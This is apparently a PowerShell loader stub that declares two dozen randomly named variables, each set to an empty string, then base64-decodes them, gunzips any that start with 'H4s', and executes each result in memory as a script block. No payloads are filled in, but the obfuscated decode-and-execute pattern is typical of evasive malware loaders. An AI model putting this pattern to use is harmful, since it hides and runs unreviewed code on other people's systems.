#Requires -Version 2

$Proportion = ""
$Prosthesis = ""
$Shrillness = ""
$Poignantly = ""
$Metternich = ""
$Hydrangeas = ""
$Revolution = ""
$Homophobic = ""
$Submissive = ""
$Regularity = ""
$Assistants = ""
$Dispirited = ""
$Untiringly = ""
$Unstopping = ""
$Acanthuses = ""
$Stunningly = ""
$Sororities = ""
$Politicize = ""
$Democritus = ""
$Disbarring = ""
$Renditions = ""
$Assignable = ""
$Mennonites = ""
$Burglarize = ""

$Modules = @($Proportion,$Prosthesis,$Shrillness,$Poignantly,$Metternich,$Hydrangeas,$Revolution,$Homophobic,$Submissive,$Regularity,$Assistants,$Dispirited,$Untiringly,$Unstopping,$Acanthuses,$Stunningly,$Sororities,$Politicize,$Democritus,$Disbarring,$Renditions,$Assignable,$Mennonites,$Burglarize)
$Modules | ForEach-Object {
    $Decoded = [System.Convert]::FromBase64String($_)
    if ($_ -like "H4s*") {
        $Decoded = ConvertFrom-Gzip -Bytes $Decoded
    }
    else {
        $Decoded = [Text.Encoding]::UTF8.GetString($Decoded)
    }
    $ScriptBlock = $ExecutionContext.InvokeCommand.NewScriptBlock($Decoded)
    . $ScriptBlock
}
